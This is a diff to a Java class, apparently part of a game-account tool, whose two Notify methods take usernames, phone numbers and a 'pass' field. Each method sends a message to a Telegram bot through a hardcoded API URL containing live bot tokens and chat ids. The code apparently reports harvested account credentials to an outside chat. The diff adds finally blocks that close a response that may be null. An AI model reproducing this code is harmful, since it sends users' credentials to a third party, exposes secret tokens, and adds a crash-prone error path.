@@ -25,6 +25,7 @@ public class BaoV28Acc {
     }
 
     public void Notify(String username, String nickname, String tien, String phone, String codedl, String pass, boolean tinhtrang){
+        Response response = null;
         try {
             String noidung = "";
             if(tinhtrang == true){
@@ -39,13 +40,17 @@ public class BaoV28Acc {
                     .url("https://api.telegram.org/bot5387231831:AAEifMCaRf5jvToxdx9uYiq4aJ94W6RKXJY/sendMessage?chat_id=-632413427&text="+noidung)
                     .method("GET", null)
                     .build();
-            Response response = client.newCall(request).execute();
+             response = client.newCall(request).execute();
         } catch (IOException e) {
             e.printStackTrace();
+        }
+        finally {
+            response.close();
         }
     }
 
     public void Notify2(String username, String nickname, String tien, String phone, String codedl, String pass, boolean tinhtrang){
+        Response response = null;
         try {
             String noidung = "";
             if(tinhtrang == true){
@@ -60,9 +65,11 @@ public class BaoV28Acc {
                     .url("https://api.telegram.org/bot5326949078:AAHuAoDzBphowtnoca10-SjUGXtSDBvImGk/sendMessage?chat_id=-794681211&text="+noidung)
                     .method("GET", null)
                     .build();
-            Response response = client.newCall(request).execute();
+            response = client.newCall(request).execute();
         } catch (IOException e) {
             e.printStackTrace();
+        }finally {
+            response.close();
         }
     }
 }
